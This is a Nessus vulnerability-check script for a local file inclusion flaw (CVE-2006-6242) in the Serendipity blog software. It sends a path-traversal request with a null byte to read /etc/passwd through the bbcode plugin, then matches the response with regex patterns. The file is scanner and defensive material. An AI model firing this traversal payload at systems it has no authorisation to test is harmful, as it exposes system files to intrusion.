#
# (C) Tenable Network Security
#



include("compat.inc");

if (description)
{
  script_id(23752);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-6242");
  script_bugtraq_id(21367);
  # OSVDB 36535-36565 (30 scripts)

  script_name(english:"Serendipity Multiple Scripts serendipity[charset] Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file with Serendipity");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple local file include issues." );
 script_set_attribute(attribute:"description", value:
"Several scripts included with the version of Serendipity installed on
the remote host fail to sanitize input to the 'serendipity[charset]'
parameter before using it to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these issues to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2869" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("serendipity_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/serendipity"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  file = "../../../../../../../../../../../etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/plugins/serendipity_event_bbcode/serendipity_event_bbcode.php?",
      "serendipity[charset]=", file ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or...
    egrep(pattern:"main\(.+/etc/passwd\\0lang/.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(.+/etc/passwd\).*: failed to open stream: No such file", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(.+/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br");
    else contents = "";

    if (contents)
    {
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
    }
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}
